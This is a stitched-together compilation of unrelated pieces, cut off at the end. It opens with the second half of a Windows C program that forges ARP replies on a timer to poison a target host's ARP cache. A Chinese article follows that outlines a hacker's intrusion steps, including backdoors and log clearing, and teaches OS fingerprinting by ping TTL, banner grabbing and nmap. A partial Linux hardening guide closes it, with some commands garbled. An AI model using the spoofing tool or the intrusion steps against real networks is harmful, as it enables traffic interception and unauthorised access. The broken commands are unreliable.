}
//getdata(lppacketr,option);
ulbytesreceived=lpPacketr->ulBytesReceived;
buf=(char *)lpPacketr->Buffer;
off=0;
while(off<ulbytesreceived)
{
if(kbhit())
{
return 0;
}
hdr=(struct bpf_hdr *)(buf+off);
off+=hdr->bh_hdrlen;
pChar=(char *)(buf+off);
base=pChar;
off=Packet_WORDALIGN(off+hdr->bh_caplen);
eth=(PETHDR)pChar; //以太头 
arp=(PARPHDR)(pChar+sizeof(ETHDR)); //arp头 
int i;

if((eth->eh_type==htons(ETH_ARP))&&
(arp->arp_opt==htons(ARP_REPLY)))
{
//if (arp->arp_tpa==htonl(ntohl(inet_addr(MYIP))))
{
if(oipandmac_flag&&myipandmac_flag&&toipandmac_flag)
return 0; 
if (((toipandmac.ip==htonl(arp->arp_spa))&&(toipandmac_flag==FALSE))
||((myipandmac.ip==htonl(arp->arp_spa))&&(myipandmac_flag==FALSE))
||((oipandmac.ip==htonl(arp->arp_spa))&&(oipandmac_flag==FALSE)))
{
memset(szTemp,0,sizeof(szTemp));
memcpy(szTemp,&arp->arp_spa,sizeof(arp->arp_spa));

printf("[IP]:");
printf("%s",inet_ntoa(*((struct in_addr *)szTemp)));
printf("[MAC]:");
for(i=0;i<5;i++)
{
printf("%.2x-",eth->eh_src[i]);
}
printf("%.2x",eth->eh_src[5]);
printf("\n"); 

if (toipandmac.ip==htonl(arp->arp_spa))
{
for(i=0;i<6;i++)
toipandmac.mac[i]=eth->eh_src[i];
toipandmac_flag=TRUE;
}
if (oipandmac.ip==htonl(arp->arp_spa))
{
for(i=0;i<6;i++)
oipandmac.mac[i]=eth->eh_src[i];
oipandmac_flag=TRUE;
// printf("if you have get the MAC Addresses enough,Press any key for staring!\n");
}
if(myipandmac.ip==htonl(arp->arp_spa))
{
for(i=0;i<6;i++)
myipandmac.mac[i]=eth->eh_src[i];
myipandmac_flag=TRUE;
}
} 
}
} 
continue;
}
}
return 0;
}

DWORD WINAPI sendARPPacket(LPVOID dwsendtoIP)
{
LPPACKET lpPacket;
ETHDR eth;
ARPHDR arphdr;
int i;
char szPacketBuf[600];
u_long sendtoIP=*(u_long *)dwsendtoIP;
//struct sockaddr_in sin;
lpPacket = PacketAllocatePacket();
if(lpPacket==NULL)
{
printf("\nPacketAllocatePacket error!");
return 0;
}
eth.eh_type=htons(ETH_ARP);
for(i=0;i<6;i++)
{
eth.eh_dst[i]=0xff;
eth.eh_src[i]=0xa5;
arphdr.arp_sha[i]=0xa5;
arphdr.arp_tha[i]=0xff;
}
arphdr.arp_hdr=htons(ARP_HARDWARE);
arphdr.arp_pro=htons(ETH_IP);
arphdr.arp_opt=htons(ARP_REQUEST);
arphdr.arp_hln=6;
arphdr.arp_pln=4;
arphdr.arp_tpa=htonl(sendtoIP);
arphdr.arp_spa=htonl(ntohl(inet_addr(MYIP)));
if(sendtoOip)
{

if(myipandmac_flag)
{
for(i=0;i<6;i++)
{
eth.eh_src[i]=myipandmac.mac[i];
arphdr.arp_sha[i]=myipandmac.mac[i];
arphdr.arp_spa=htonl(myipandmac.ip);
//memset(MYIP,0,sizeof(MYIP));

}
}
else
{
printf("My MAC Address Can't Find!\n");
return 0;
}
}
memset(szPacketBuf,0,sizeof(szPacketBuf));
memcpy(szPacketBuf,e,sizeof(ETHDR));
memcpy(szPacketBuf+sizeof(ETHDR),&arphdr,sizeof(ARPHDR));
PacketInitPacket(lpPacket,szPacketBuf,60);
if(PacketSetNumWrites(lpAdapter, 1)==FALSE)
{
printf("warning: Unable to send more than one packet in a single write!\n");
}
if(PacketSendPacket(lpAdapter, lpPacket, TRUE)==FALSE)
{
printf("Error sending the packets!\n");
PacketFreePacket(lpPacket);
return 0;
}
PacketFreePacket(lpPacket);
return 0;
}

DWORD WINAPI sendSR()
{
ETHDR eth;
ARPHDR arphdr;
int i;
char szPacketBuf[600];
LPPACKET lpPacket;
unsigned char toMAC[6];
struct sockaddr_in sin;
u_long toIP=mytoIP;
//if ((myipandmac_flag==FALSE)||(oipandmac_flag==FALSE)||(toipandmac_flag==FALSE))
//{
// printf("Can't get all MAC address!\n");
// return 0;
//}
lpPacket = PacketAllocatePacket();
if(lpPacket == NULL)
{
printf("\nError:failed to allocate the LPPACKET structure.\n");
return 0;
}
if (toipandmac_flag==FALSE)
{
printf("Can't get toMAC address!\n");
return 0;
}
memset(toMAC,0,sizeof(toMAC));
memcpy(toMAC,&toipandmac.mac,sizeof(toipandmac.mac));
if (param6)
{
for(i=0;i<6;i++)
{
int t1,t2;
char c1,c2;
c1=noMAC[i][0];
c2=noMAC[i][1];
t1=getint(c1);
t2=getint(c2);
if((t1==-1)||(t2==-1))
{
printf("-m parameter error!\n");
return 0;
}

eth.eh_src[i]=t1*16+t2;
eth.eh_dst[i]=toMAC[i];
arphdr.arp_sha[i]=t1*16+t2;
arphdr.arp_tha[i]=toMAC[i];
}
}
else
{
for(i=0;i<6;i++)
{
eth.eh_src[i]=toMAC[i];
eth.eh_dst[i]=toMAC[i];
arphdr.arp_sha[i]=toMAC[i];
arphdr.arp_tha[i]=toMAC[i];
}
}
eth.eh_type=htons(ETH_ARP);
arphdr.arp_spa=htonl(oIP);
arphdr.arp_tpa=htonl(toIP);
arphdr.arp_hdr=htons(ARP_HARDWARE);
arphdr.arp_pro=htons(ETH_IP);
arphdr.arp_opt=htons(ARP_REPLY);
arphdr.arp_hln=6;
arphdr.arp_pln=4;
memset(szPacketBuf,0,sizeof(szPacketBuf));
memcpy(szPacketBuf,e,sizeof(ETHDR));
memcpy(szPacketBuf+sizeof(ETHDR),&arphdr,sizeof(ARPHDR));
PacketInitPacket(lpPacket,szPacketBuf,60);
if(PacketSetNumWrites(lpAdapter, 1)==FALSE)
{
printf("warning: Unable to send more than one packet in a single write!\n");
}
if(PacketSendPacket(lpAdapter, lpPacket, TRUE)==FALSE)
{
printf("Error sending the packets!\n");
PacketFreePacket(lpPacket);
return 0;
}
PacketFreePacket(lpPacket);
sin.sin_addr.s_addr=arphdr.arp_tpa;
printf("spoof %s: ",inet_ntoa(sin.sin_addr));
sin.sin_addr.s_addr=arphdr.arp_spa;
printf("%s-->",inet_ntoa(sin.sin_addr));
for(i=0;i<5;i++)
printf("%.2x-",arphdr.arp_sha[i]);
printf("%x",arphdr.arp_sha[5]); 
printf("\n");
return 0;
}

DWORD WINAPI sendSRTimer(LPVOID dwtoIP)
{ 
printf("Waiting spoof Start\n");
mytoIP=*(u_long *)dwtoIP;
newtimer=SetTimer(NULL,NULL,5*1000,TIMERPROC(sendSR));
while(GetMessage(&msg,0,0,0))
{
TranslateMessage(&msg); 
DispatchMessage(&msg); 
}
return 0;
}
int main(int argc,char *argv[])
{
HANDLE thread1,thread2,thread3;
WCHAR adaptername[8192];
WCHAR *name1,*name2;
ULONG adapterlength;
DWORD threadid1,threadid2,threadid3;
u_long toIP,myip;
struct NetType ntype;
struct sockaddr_in sin;
struct npf_if_addr ipbuff;
int adapternum=0,opti=0,open,i,j;
long npflen;
if((argc!=5)&&(argc!=7))
{
start();
return 0;
}
else if((strcmp(argv[1],"-h")!=0)||(strcmp(argv[3],"-o")!=0))
{
start();
return 0;
}
toIP=ntohl(inet_addr(argv[2]));
oIP=ntohl(inet_addr(argv[4]));
if (argv[5]!=NULL)
{
if (strcmp(argv[5],"-m")==0)
{
noMACstr=argv[6];
j=0;
for(i=0;i<6;i++)
{
memset(noMAC[i],0,sizeof(noMAC[i]));
memcpy(noMAC[i],noMACstr,2);
noMACstr=noMACstr+3;
}
param6=TRUE;
}
}
printf("\nLibarary Version: %s",PacketGetVersion());
adapterlength=sizeof(adaptername);
if(PacketGetAdapterNames((char *)adaptername,&adapterlength)==FALSE) //得到网卡列表
{
printf("PacketGetAdapterNames Error: %d\n",GetLastError());
return -1;
}

name1=adaptername;
name2=adaptername;
i=0;
while((*name1!='\0') || (*(name1-1)!='\0'))
{
if(*name1=='\0')
{
memcpy(adapterlist[i],name2,2*(name1-name2));
name2=name1+1;
i++;
}
name1++;
}
adapternum=i;
printf("\nAdapters Installed:\n");
for(i=0;i<adapternum;i++)
wprintf(L"%d - %s\n",i+1,adapterlist[i]);
do
{
printf("\nSelect the number of the adapter to open: ");
scanf("%d",&open);
if(open>=1 && open<=adapternum)
break; 
}while(open<1 || open>adapternum);
lpAdapter=PacketOpenAdapter(adapterlist[open-1]);
if(!lpAdapter || (lpAdapter->hFile==INVALID_HANDLE_value))
{
printf("PacketOpenAdapter Error: %d\n",GetLastError());
return -1;
}
if(PacketGetNetType(lpAdapter,&ntype))
{
printf("\n\t\t*** Host Information ***\n");
printf("[LinkTpye:]\t%d\t\t",ntype.LinkType); 
printf("[LinkSpeed:]\t%d b/s\n",ntype.LinkSpeed);
}
npflen=sizeof(ipbuff); 
if(PacketGetNetInfoEx(adapterlist[open-1],&ipbuff,&npflen))
{
sin=*(struct sockaddr_in *)&(ipbuff.Broadcast);
printf("[Broadcast:]\t%.16s\t",inet_ntoa(sin.sin_addr));
sin=*(struct sockaddr_in *)&(ipbuff.SubnetMask);
printf("[SubnetMask:]\t%.16s\n",inet_ntoa(sin.sin_addr));
sin=*(struct sockaddr_in *)&(ipbuff.IPAddress);
printf("[IPAddress:]\t%.16s\t",inet_ntoa(sin.sin_addr));
myip=ntohl(sin.sin_addr.s_addr);
printf("[MACAddress:]");
}
else
{
printf("\nNot get enough data\n");
//PacketFreePacket(lppackets);
PacketCloseAdapter(lpAdapter);
return -1;
}
printf("\n");
oipandmac.ip=oIP;
toipandmac.ip=toIP;
myipandmac.ip=myip;
sendtoOip=FALSE;

thread1=CreateThread(NULL,0,sniff,NULL,0,&threadid1);
Sleep(300);
thread2=CreateThread(NULL,0,sendARPPacket,(LPVOID)&myip,0,&threadid2);
Sleep(100);
CloseHandle(thread2);
thread2=CreateThread(NULL,0,sendARPPacket,(LPVOID)&toIP,0,&threadid2);
Sleep(10);
CloseHandle(thread2);
sendtoOip=TRUE;
Sleep(200);
thread2=CreateThread(NULL,0,sendARPPacket,(LPVOID)&oIP,0,&threadid2);
Sleep(10);
CloseHandle(thread2);
// WaitForSingleObject(thread1,INFINITE);
thread3=CreateThread(NULL,0,sendSRTimer,(LPVOID)&toIP,0,&threadid3);
WaitForSingleObject(thread3,INFINITE);
PacketCloseAdapter(lpAdapter);
return 0;
}
黑客对系统识别的基本方法
对操作系统的认识，对于每一个从事计算行业的人都是非常重要，要成为一名黑客更是要对操作系统有深入、深刻的认识。下面就和大家一起来探讨一下这方面的问题。
我们先来看分析一下一个黑客入侵的基本过程：1、判断入侵对象的操作系统—>2、描扫端口，判断开放了那些服务（这两步有可能同时进行）—>3、跟据操作系统和所开放的服务选择入侵方法，通常有“溢出”和“弱口猜测”两种方法—>4、获得系统的最高权力—>5、安放后门、清除日志走人（ ：）也许有格盘走人的）。
由上面可以知道，在整个过程当中对操作系统类型的判断识别是最基本也是很关系的一步。可想而知，如果你连对方的操作系统是什么都不知道，要想入侵跟本无从谈起。
也许很少人问过自己，我们为什么要先了解对方的操作系统呢？其实，我们了解操作系统的原因是因为我们要了解系统内存的工作况态，了解它是以什么方式，基于什么样的技术来控制内存，以及怎么样来处理输入与输出的数据的。世上任何东西都不可能是尽善尽美的（当然这也是我们人类不断追求的动力所在），作为复杂的计算机系统更如此，它在控制内存与处理数据的过程中总是有可能出错的（特别是在安装了其它的应用程序以后），系统本身也会存在各种各样的弱点与不足之处。黑客之所以能够入侵，就是利用了这些弱点与错误。现在网上流行的各种各样的入侵工具，都是黑客在分析了系统的弱点及存在的错之后编写出来的。（其中以“缓冲区溢出”最为常见）
作为一般的黑客，我们只要善于使用现成的入侵工具，就可以达到我们入侵的目的。但是因为不同的系统，其工作原理不一样，所以不同的入侵工具只能针对相应的操作系统。因此，对操作系统的识别是必不可少的，这就需要我们对操作系统有相当的了解，对网络有一定的基础识（要作黑客还是不那么容易的），关于各类操作系统的介绍，在网上有成堆的文章，大家可以自己去查阅。
在此介绍一此简单的操作系统识别方法给大家，希望对大家有用。
一、用ping来识别操作系统
C:\>ping 10.1.1.2

Pinging 10.1.1.2 with 32 bytes of data:

Reply from 10.1.1.2: bytes=32 time<10ms TTL=128
Reply from 10.1.1.2: bytes=32 time<10ms TTL=128
Reply from 10.1.1.2: bytes=32 time<10ms TTL=128
Reply from 10.1.1.2: bytes=32 time<10ms TTL=128

Ping statistics for 10.1.1.2:
Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
Minimum = 0ms, Maximum = 0ms, Average = 0ms

C:\>
C:\>ping 10.1.1.6

Pinging 10.1.1.6 with 32 bytes of data:

Request timed out.
Reply from 10.1.1.6: bytes=32 time=250ms TTL=237
Reply from 10.1.1.6: bytes=32 time=234ms TTL=237
Reply from 10.1.1.6: bytes=32 time=234ms TTL=237

Ping statistics for 10.1.1.6:
Packets: Sent = 4, Received = 3, Lost = 1 (25% loss),
Approximate round trip times in milli-seconds:
Minimum = 234ms, Maximum = 250ms, Average = 179ms
我们跟据ICMP报文的TTL的值，我们就可以大概知道主机的类型。如：TTL=125左右的主机应该是windows系列的机子，TTL=235左右的主机应该是UINX系列的机子。如上面的两个例子，10.1.1.2就是win2000的机子，而10.1.1.6则是UINX（Sunos 5.8）的机子。这是因为不同操作系统的机子对ICMP报文的处理与应答是有所不同的，TTL值每过一个路由器会减1。所以造成了TTL回复值的不同。对于TTL值与操作系统类型的对应，还要靠大家平时多注意观察和积累。
二、直接通过联接端口根据其返回的信息来判操作系统
这种方法应该说是用得最多的一种方法，下面我们来看几个实例。
1、如果机子开了80端口，我们可以telnet（当然如果有NC最好用NC，它可以不用盲打）它的80端口。
Microsoft Windows 2000 [Version 5.00.2195]
(C) 版权所有 1985-1998 Microsoft Corp.

C:\>telnet 10.1.1.2 80 
输入get 回车（注意这里是盲打）
如果返回，
HTTP/1.1 400 Bad Request
Server: Microsoft-IIS/5.0
Date: Fri, 11 Jul 2003 02:31:55 GMT
Content-Type: text/html
Content-Length: 87

<html><head><title>Error</title></head><body>The parameter is incorrect. </body>
</html>

遗失对主机的连接。
C:\>
那么这台就肯定是windows的机子。
如果返回，
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"> <HTML><HEAD> <title>501 Method
Not Implemented</title> </HEAD><BODY> <H1>Method Not Implemented</H1> get to / not
supported.<P> Invalid method in request get<P><HR> <ADDRESS>Apache/1.3.27 Server at gosiuniversity.com Port 80</ADDRESS>
</BODY></HTML>
遗失对主机的连接。
C:\>
那么多数就是UINX系统的机子了。
2、如果机子开了21端口，我们可以直接FTP上去
C:\>ftp 10.1.1.2
如果返回，
Connected to 10.1.1.2.
220 sgyyq-c43s950 Microsoft FTP Service (Version 5.0).
User (10.1.1.2:(none)):
那么这就肯定是一台win2000的机子了，我们还可以知道主机名呢，主机名就是sgyyq-c43s950。这个FTP是windows的IIS自带的一个FTP服务器。
如果返回，
Connected to 10.1.1.3.
220 Serv-U FTP Server v4.0 for WinSock ready...
User (10.1.1.3:(none)):
也可以肯定它是windows的机子，因为Serv-U FTP是一个专为windows平台开发的FTP服务器。
如果返回，
Connected to 10.1.1.3.
220 ready, dude (vsFTPd 1.1.0: beat me, break me)
User (10.1.1.3:(none)):
那么这就是一台UINX的机子了。
3、如果开了23端口，这个就简单了，直接telnet上去。
如果返回，
Microsoft (R) Windows (TM) Version 5.00 (Build 2195)
Welcome to Microsoft Telnet Service
Telnet Server Build 5.00.99201.1
login:
那么这肯定是一台windows的机子了
如果返回，
SunOS 5.8
login:
不用说了，这当然是一台UINX的机子了，并且版本是SunOS 5.8的。
三、利用专门的软件来识别
这种有识别操作系统功能的软件，多数采用的是操作系统协议栈识别技术。这是因为不同的厂家在编写自己操作系统时，TCP/IP协议虽然是统一的，但对TCP/IP协议栈是没有做统一的规定的，厂家可以按自己的要求来编写TCP/IP协议栈，从而造成了操作系统之间协议栈的不同。因此我们可以通过分析协议栈的不同来区分不同的操作系统，只要建立起协议栈与操作系统对应的数据库，我们就可以准确的识别操作系统了。目前来说，用这种技术识别操作系统是最准确，也是最科学的。因此也被称为识别操作系统的“指纹技术”。当然识别的能力与准确性，就要看各软件的数据库建立情况了。
下面是简单介绍两款有识别功能的软件。
1、 著名的nmap，它采用的是主动式探测，探测时会主动向目标系统发送探测包，根据目标目标机回应的数据包来，叛断对方机的操作系统。用法如下：
F:\nmap>nmap -vv -sS -O 10.1.1.5

Starting nmap V. 3.00 ( www.insecure.org/nmap )
Host IS~123456ADCD (10.1.1.5) appears to be up ... good.
Initiating SYN Stealth Scan against IS~123456ADCD (10.1.1.5)
Adding open port 139/tcp
Adding open port 7070/tcp
Adding open port 554/tcp
Adding open port 23/tcp
Adding open port 1025/tcp
Adding open port 8080/tcp
Adding open port 21/tcp
Adding open port 5050/tcp
Adding open port 9090/tcp
Adding open port 443/tcp
Adding open port 135/tcp
Adding open port 1031/tcp
Adding open port 3372/tcp
Adding open port 25/tcp
Adding open port 1433/tcp
Adding open port 3389/tcp
Adding open port 445/tcp
Adding open port 80/tcp
The SYN Stealth Scan took 1 second to scan 1601 ports.
For OSScan assuming that port 21 is open and port 1 is closed and neither ar
rewalled
Interesting ports on IS~123456ADCD (10.1.1.5):
(The 1583 ports scanned but not shown below are in state: closed)
Port State Service
21/tcp open ftp
23/tcp open telnet
25/tcp open smtp
80/tcp open http
135/tcp open loc-srv
139/tcp open netbios-ssn
443/tcp open https
445/tcp open microsoft-ds
554/tcp open rtsp
1025/tcp open NFS-or-IIS
1031/tcp open iad2
1433/tcp open ms-sql-s
3372/tcp open msdtc
3389/tcp open ms-term-serv
5050/tcp open mmcc
7070/tcp open realserver
8080/tcp open http-proxy
9090/tcp open zeus-admin
Remote operating system guess: Windows 2000/XP/ME
OS Fingerprint:
TSeq(Class=RI%gcd=1%SI=21F8%IPID=I%TS=0)
T1(Resp=Y%DF=Y%W=FAF0%ACK=S++%Flags=AS%Ops=MNWNNT)
T2(Resp=Y%DF=N%W=0%ACK=S%Flags=AR%Ops=)
T3(Resp=Y%DF=Y%W=FAF0%ACK=S++%Flags=AS%Ops=MNWNNT)
T4(Resp=Y%DF=N%W=0%ACK=O%Flags=R%Ops=)
T5(Resp=Y%DF=N%W=0%ACK=S++%Flags=AR%Ops=)
T6(Resp=Y%DF=N%W=0%ACK=O%Flags=R%Ops=)
T7(Resp=Y%DF=N%W=0%ACK=S++%Flags=AR%Ops=)
PU(Resp=Y%DF=N%TOS=0%IPLEN=38%RIPTL=148%RIPCK=E%UCK=E%ULEN=134%DAT=E)

TCP Sequence Prediction: Class=random positive increments
Difficulty=8696 (Worthy challenge)
TCP ISN Seq. Numbers: 5B9022E2 5B914E12 5B92A495 5B93915A 5B94A9B5 5B95CC64
IPID Sequence Generation: Incremental

Nmap run completed -- 1 IP address (1 host up) scanned in 2 seconds

其中 Remote operating system guess: Windows 2000/XP/ME 这行就是NMAP对操作系统类型的判断。还返回了好多信息，NMAP不愧为扫描之王。（哈哈，黑客必备哦！）
2、 天眼，采用的是被动式的探测方法。不向目标系统发送数据包，只是被动地探测网络上的通信数据，通过分析这些数据来判断操作系统的类型。配合supersan使用，较果很好。
具体的使用方法，在此就不具体介绍了。有兴趣的的朋友可以到网上搜一下关于天眼使用方法的文章，会有很多的。
以上讲解了一些对操作系统识别的基本方法，希望对初学者有用。由于本人水平有限，不当之处，还请高手斧正！
LINUX安全管理的基本技巧
Linux作为是一个开放源代码的免费操作系统，以其高效隐定的优秀品质，越来越受到用户们的欢迎，并在全世界不断普及开来。相信在不久的将来Linux还会得到更大更快的发展。虽然，Linux和Unix很相似，但是它们之间还是有不少重要的差别。对于很多习惯了UNIX和Windows的系统管理员来讲，如何保证Linux操作系统的安全可靠将面临许多新的挑战。本文在此将给大家介绍一些Linux管理安全的基本技巧，希望能对大家有所帮助（甚感欣慰）。
首先我想从系统的安全配置，开始我们的话题。因为我个人认为一位管理员要能充分利用系统提供的安全机制、挖掘系统自身的潜力来对服务器进行高效安全的维护，才能称得上优秀。我并不是完全反对使用防火墙等工具，但是正如人一样，我们可以消毒、可以带口罩，却没有我们自身体魄强健、有抗体来得好。Linux是完全开放源代码的免费操作系统，其可开发的潜力极大，有能力的管理员甚至可以通过自行改编内核来满足自己服务器优良工作的需要。当然，在此我们只讲一些基本，但实用的配置技巧。
一、 ILO的安全设置 
LILO是Linux Loader的缩写，它是LINUX的启动模块。我们可通过修改“/etc/lilo.conf”文件中的内容来对它进行配置。在文件中加上，如下两个参数：restricted,password。这两个参数可以使你的系统在启动lilo时就要求密码验证。 
boot=/dev/hda 
　　map=/boot/map 
　　install=/boot/boot.b 
　　prompt 
　　timeout=00 #把这行该为00，这样系统启动时将不在等待，而直接启动LINUX 
　　message=/boot/message 
　　linear 
　　default=linux 
　　restricted #加入这行 
　　password= #加入这行并设置自己的密码 
　　image=/boot/vmlinuz-2.4.2-2 
　　label=linux 
　　root=/dev/hda6 
　　read-only
因为"/etc/lilo.conf"文件中包含明文密码，所以要把它设置为root权限读取。 
　　# chmod 0600 /etc/lilo.conf 
还要使用“chattr”命令使"/etc/lilo.conf"文件变为不可改变。 
　　# chattr +i /etc/lilo.conf 
　　这样可以对“/etc/lilo.conf”文件起到很好的保护作用。（对其它文件的保护也可以采用此方法）
最后要使lilo.conf文件生效要用
# /sbin/lilo -v 
更新一下系统。
二、 口令安全
口令可以说是系统的第一道防线，目前网络上大部分的系统入侵都是从猜测口令或者截获口令开始的，所以口令安全至关重要。
首先要杜绝不设口令的帐号存在。这可以通过查看/etc/passwd文件来发现。例如，
存在用户名为test的帐号，没有设置口令，则在/etc/passwd文件中就有如下一行： 
test::100:9::/home/test:/bin/bash 
其第二项为空，说明test这个帐号没有设置口令，这是非常危险的！应将该类帐号删除或者设置口令。 
其次，在旧版本的linux中，在/etc/passwd文件中是包含有加密的密码的，这就给系统的安全性带来了很大的隐患，最简单的方法就是可以用暴力破解的方法来获得口令（如，用John等工具）。可以使用命令/usr/sbin/pwconv或者/usr/sbin/grpconv来建立/etc/shadow或者/etc/gshadow文件，这样在/etc/passwd文件中不再包含加密的密码，而是放在/etc/shadow文件中，该文件只有超级用户root可读！
第三点是修改一些系统帐号的Shell变量，例如uucp,ftp和news等，还有一些仅仅需要FTP功能的帐号，一定不要给他们设置/bin/bash或者/bin/sh等Shell变量。可以在/etc/passwd中将它们的Shell变量置空，例如设为/bin/false或者/dev/null等，也可以使用usermod -s /dev/null username命令来更改username的Shell为/dev/null。这样使用这些帐号将无法Telnet远程登录到系统中来！ 
第四点是修改缺省的密码长度：在你安装linux时默认的密码长度是5个字节。但这并不够，要把它设为8。修改最短密码长度需要编辑login.defs文件（vi/etc/login.defs），把下面这行 
　　PASS_MIN_LEN 5 
　　改为 
　　PASS_MIN_LEN 8 
　　login.defs文件是login程序的配置文件。 
最后别忙了为root加上一个强壮的密码，8位以上，最好包含特殊字符。
三、 登录安全
1、自动注销帐号的登录，在unix系统中root账户是具有最高特权的。如果系统管理员在离开系统之前忘记注销root账户，那将会带来很大的安全隐患，应该让系统会自动注销。通过修改账户中“TMOUT”参数，可以实现此功能。TMOUT按秒计算。编辑你的profile文件（vi /etc/profile）,在"HISTFILESIZE="后面加入下面这行： 
　　TMOUT=300 
　　300，表示300秒，也就是表示5分钟。这样，如果系统中登陆的用户在5分钟内都没有动作，那么系统会自动注销这个账户。你可以在个别用户的“.bashrc”文件中添加该值，以便系统对该用户实行特殊的自动注销时间。 
　　改变这项设置后，必须先注销用户，再用该用户登陆才能激活这个功能。 
2、使用PAM（可插拔认证模块）禁止任何人通过su命令改变为root用户su(Substitute 
　　User替代用户)命令允许你成为系统中其他已存在的用户。如果你不希望任何人通过su命令改变为root用户或对某些用户限制使用su命令，你可以在su配置文件（在"/etc/pam.d/"目录下）的开头添加下面两行： 
编辑su文件(vi /etc/pam.d/su)，在开头添加下面两行： 
　　auth sufficient /lib/security/pam_rootok.so 
　　auth required /lib/security/Pam_wheel.so group=wheel 
　　这表明只有"wheel"组的成员可以使用su命令成为root用户。你可以把用户添加到“wheel”组，以使它可以使用su命令成为root用户。添加方法可以用这个命令：chmod -G10 username 。 

　 四、控制台访问安全
1、取消普通用户的控制台访问权限，你应该取消普通用户的控制台访问权限。
比如shutdown、reboot、halt等命令。 
　　# rm -f /etc/security/console.apps/ 
　　是你要注销的程序名。 
2、不允许从不同的控制台进行root登陆 
　　"/etc/securetty"文件允许你定义root用户可以从那个TTY设备登陆。你可以编辑"/etc/securetty"文件，再不需要登陆的TTY设备前添加“#”标志，来禁止从该TTY设备进行root登陆。 
　　在/etc/inittab文件中有如下一段话： 
　　# Run gettys in standard runlevels 
　　1:2345:respawn:/sbin/mingetty tty1 
　　2:2345:respawn:/sbin/mingetty tty2 
　　#3:2345:respawn:/sbin/mingetty tty3 
　　#4:2345:respawn:/sbin/mingetty tty4 
　　#5:2345:respawn:/sbin/mingetty tty5 
　　#6:2345:respawn:/sbin/mingetty tty6 
　　系统默认的可以使用6个控制台，即Alt+F1,Alt+F2...，这里在3，4，5，6前面加上“#”，注释该句话，这样现在只有两个控制台可供使用，最好保留两个。然后重新启动init进程，改动即可生效！ 

五、服务安全
取消并反安装所有不用的服务 
　　取消并反安装所有不用的服务，这样你的担心就会少很多。察看“/etc/inetd.conf”文件，通过注释取消所有你不需要的服务（在该服务项目之前加一个“#”）。然后用“sighup”命令升级“inetd.conf”文件。 
第一步： 
　　更改“/etc/inetd.conf”权限为600，只允许root来读写该文件。 
　　# chmod 600 /etc/inetd.conf 
　　第二步： 
　　确定“/etc/inetd.conf”文件所有者为root。 
　　第三步： 
　　编辑 /etc/inetd.conf文件（vi /etc/inetd.conf），取消下列服务（你不需要的）：ftp, telnet, shell, login, exec, talk, ntalk, imap, pop-2, pop-3, finger, auth等等。把不需要的服务关闭可以使系统的危险性降低很多。 

　　第四步： 
　　给inetd进程发送一个HUP信号： 
　　# killall -HUP inetd 
　　第五步： 
　　用chattr命令把/ec/inetd.conf文件设为不可修改，这样就没人可以修改它： 
　　# chattr +i /etc/inetd.conf 
　　 这样可以防止对inetd.conf的任何修改（意外或其他原因）。唯一可以取消这个属性的人只有root。如果要修改inetd.conf文件，首先要是取消不可修改性质： 
　　# chattr -i /etc/inetd.conf 
　　同时修“/etc/services”文件的属性，防止未经许可的删除或添加服务： 
　　# chattr +i /etc/services 
别忘了以后要修改时，再把它们的性质改为可修改的就行了。 
六、其它综合设置安全
1、TCP_WRAPPERS 
　　使用TCP_WRAPPERS可以使你的系统安全面对外部入侵。最好的策略就是阻止所有的主机（"/etc/hosts.deny"文件中加入"ALL: ALL@ALL, PARANOID" ），然后再在"/etc/hosts.allow" 文件中加入所有允许访问的主机列表。 
　　第一步： 
　　编辑hosts.deny文件（vi /etc/hosts.deny），加入下面这行 
　　# Deny access to everyone. 
　　ALL: ALL@ALL, PARANOID 
　　这表明除非该地址包在允许访问的主机列表中，否则阻塞所有的服务和地址。 
　　第二步： 
　　编辑hosts.allow文件（vi /etc/hosts.allow），加入允许访问的主机列表，比如： 
　　ftp: 202.54.15.99 foo.com 
　　202.54.15.99和 foo.com是允许访问ftp服务的ip地址和主机名称。 
　　第三步： 
　　tcpdchk程序是tepd wrapper设置检查程序。它用来检查你的tcp wrapper设置，并报告发现的潜在的和真实的问题。设置完后，运行下面这个命令： 
　　# tcpdchk 
　　2、修改“/etc/host.conf”文件 
　　“/etc/host.conf”说明了如何解析地址。编辑“/etc/host.conf”文件（vi /etc/host.conf），加入下面这行： 
　　# Lookup names via DNS first then fall back to /etc/hosts. 
　　order bind,hosts 
　　# We have machines with multiple IP addresses. 
　　multi on 
　　# Check for IP address spoofing. 
　　nospoof on 
　　第一项设置首先通过DNS解析IP地址，然后通过hosts文件解析。第二项设置检测是否“/etc/hosts”文件中的主机是否拥有多个IP地址（比如有多个以太口网卡）。第三项设置说明要注意对本机未经许可的电子欺骗。 
　　3、Shell logging Bash 
　　shell在“~/.bash_history”（“~/”表示用户目录）文件中保存了500条使用过的命令，这样可以使你输入使用过的长命令变得容易。每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件。bash 
shell应该保存少量的命令，并且在每次用户注销时都把这些历史命令删除。 
　　第一步： 
　　“/etc/profile”文件中的“HISTFILESIZE”和“HISTSIZE”行确定所有用户的“.bash_history”文件中可以保存的旧命令条数。强烈建议把把“/etc/profile”文件中的“HISTFILESIZE”和“HISTSIZE”行的值设为一个较小的数，比如30。编辑profile文件（vi/etc/profile），把下面这行改为： 
　　HISTFILESIZE=30 
　　HISTSIZE=30 
　　这表示每个用户的“.bash_history”文件只可以保存30条旧命令。 
　　第二步： 
　　网管还应该在"/etc/skel/.bash_logout" 文件中添加下面这行"rm -f $HOME/.bash_history" 。这样，当用户每次注销时，“.bash_history”文件都会被删除。 
　　编辑.bash_logout文件(vi /etc/skel/.bash_logout) ，添加下面这行： 
　　rm -f $HOME/.bash_history 
　　4、禁止Control-Alt-Delete键盘关闭命令 
　　在"/etc/inittab" 文件中注释掉下面这行（使用#）： 
　　ca::ctrlaltdel:/sbin/shutdown -t3 -r now 
　　改为： 
　　#ca::ctrlaltdel:/sbin/shutdown -t3 -r now 
　　为了使这项改动起作用，输入下面这个命令： 
　　# /sbin/init q 

　　5、给"/etc/rc.d/init.d" 下script文件设置权限 
　　给执行或关闭启动时执行的程序的script文件设置权限。 
　　# chmod -R 700 /etc/rc.d/init.d/* 
　　这表示只有root才允许读、写、执行该目录下的script文件。 
6、隐藏系统信息 
　　在缺省情况下，当你登陆到linux系统，它会告诉你该linux发行版的名称、版本、内核版本、服务器的名称。对于黑客来说这些信息足够它入侵你的系统了。你应该只给它显示一个“login:”提示符。 
　　首先编辑"/etc/rc.d/rc.local" 文件，在下面显示的这些行前加一个“#”，把输出信息的命令注释掉。 
